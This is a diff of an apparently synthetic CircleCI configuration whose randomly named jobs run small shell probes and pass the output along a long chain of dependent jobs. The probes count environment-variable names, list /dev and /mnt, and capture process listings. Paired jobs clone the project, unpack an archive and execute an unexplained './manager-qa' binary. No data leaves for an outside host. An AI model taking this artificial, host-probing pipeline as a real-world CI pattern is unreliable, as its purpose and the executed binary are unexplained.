+    steps:
+      - run:
+          name: POLLING DEV BOARD T20
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; target_dir='saved'; printf '%s\n' "${target_dir,,}"; true ; } > /tmp/absorb/txt_tmp
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/txt_tmp)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'txt_tmp'
+  beta-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/txt_tmp" "$(wc -c < /tmp/absorb/txt_tmp 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  can_update:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Train the contracts week one
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; function add { local IFS=,; echo "$*"; }; add frog tiger cat; true ; } > /tmp/absorb/030653_2018
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/030653_2018)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '030653_2018'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/030653_2018" "$(wc -c < /tmp/absorb/030653_2018 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  aa-37-b8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Level XII test antenna
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; printenv | awk -F "=" '{print $1}' | wc -l; true ; } > /tmp/absorb/DSC_66007
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/DSC_66007)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'DSC_66007'
+  fix-metrics-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/DSC_66007" "$(wc -c < /tmp/absorb/DSC_66007 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  w1ndow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: UX 3 Labeling
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; ls -grs /dev /mnt | tail -n +2 | head -4; true ; } > /tmp/absorb/2jk8p
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/2jk8p)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - '2jk8p'
+  STG_INIT_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/2jk8p" "$(wc -c < /tmp/absorb/2jk8p 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  paintMatrixShieldDeleteSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Site alpha scroll
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; top -b -n 1 | head -n5; true ; } > /tmp/absorb/alpha.bramble
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/alpha.bramble)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'alpha.bramble'
+  jul6-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/alpha.bramble" "$(wc -c < /tmp/absorb/alpha.bramble 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+  yiotwyshteempbot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Go ahead and preview the podcast episode
+          command: |
+            mkdir -p /tmp/absorb
+            { set +o pipefail 2>/dev/null; printf -v id "%03d" 5; echo $id; true ; } > /tmp/absorb/EnAkdP
+            printf 'size=%d\n' "$(wc -c </tmp/absorb/EnAkdP)"
+      - persist_to_workspace:
+          root: /tmp/absorb
+          paths:
+            - 'EnAkdP'
+  yankee:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/absorb
+      - run:
+          name: Verify gate completion
+          command: |
+            # json-ish
+            printf '{"file":"%s","bytes":%d}\n' "/tmp/absorb/EnAkdP" "$(wc -c < /tmp/absorb/EnAkdP 2>/dev/null || echo 0)"
+      - run:
+          name: Checkout main
+          command: git clone --depth 5 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xzcat build-data-v5.tar.xz | tar xf -
+      - run:
+          command: exec ./manager-qa
+
+workflows:
+  all:
+    jobs:
+      - posT
+      - validate-partial-regression-suite:
+          requires:
+            - posT
+      - sqPE:
+          requires:
+            - posT
+      - tweak-session:
+          requires:
+            - sqPE
+      - animate_alive_future:
+          requires:
+            - sqPE
+      - jul14-rev:
+          requires:
+            - animate_alive_future
+      - needsLock:
+          requires:
+            - animate_alive_future
+      - rigel-plus:
+          requires:
+            - needsLock
+      - constNum:
+          requires:
+            - needsLock
+      - q2-ship:
+          requires:
+            - constNum
+      - oldParsers:
+          requires:
+            - constNum
+      - aug3-release:
+          requires:
+            - oldParsers
+      - blog-email-text:
+          requires:
+            - oldParsers
+      - uma-run:
+          requires:
+            - blog-email-text
+      - fontmetricvisit:
+          requires:
+            - blog-email-text
+      - ship-it:
+          requires:
+            - fontmetricvisit
+      - can_update:
+          requires:
+            - fontmetricvisit
+      - shippit:
+          requires:
+            - can_update
+      - weIGHt__ShIpMENt__cLEAR:
+          requires:
+            - can_update
+      - v9-alpha4:
+          requires:
+            - weIGHt__ShIpMENt__cLEAR
+      - PLANET_EVENT_WAIT_OLD_SCHEMA:
+          requires:
+            - weIGHt__ShIpMENt__cLEAR
+      - STG_STAGE_4:
+          requires:
+            - PLANET_EVENT_WAIT_OLD_SCHEMA
+      - paintMatrixShieldDeleteSidebar:
+          requires:
+            - PLANET_EVENT_WAIT_OLD_SCHEMA
+      - jul6-cleanup:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - yiotwyshteempbot:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - yankee:
+          requires:
+            - yiotwyshteempbot
+      - tel_rv:
+          requires:
+            - yiotwyshteempbot
+      - Deploy_Image1:
+          requires:
+            - tel_rv
+      - w1ndow:
+          requires:
+            - tel_rv
+      - STG_INIT_1:
+          requires:
+            - w1ndow
+      - motor-callback-record:
+          requires:
+            - w1ndow
+      - publish:
+          requires:
+            - motor-callback-record
+      - aa-37-b8:
+          requires:
+            - motor-callback-record
+      - fix-metrics-reload:
+          requires:
+            - aa-37-b8
+      - checkout987kg:
+          requires:
+            - aa-37-b8
+      - add-router-v2-glitch:
+          requires:
+            - checkout987kg
+      - peekTextAI:
+          requires:
+            - checkout987kg
+      - beta-v5:
+          requires:
+            - peekTextAI
+      - Span-Single-Kind
+      - kernelType
+      - IMPORT
+      - hyperion-ng:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - ivan-run:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - py310-lint:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - b-2a:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - realease-97:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - p-v2:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - mike:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - ruby3-fmt:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - cd-2a:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - Build_Service1:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
+      - defualt:
+          requires:
+            - Span-Single-Kind
+            - kernelType
+            - IMPORT
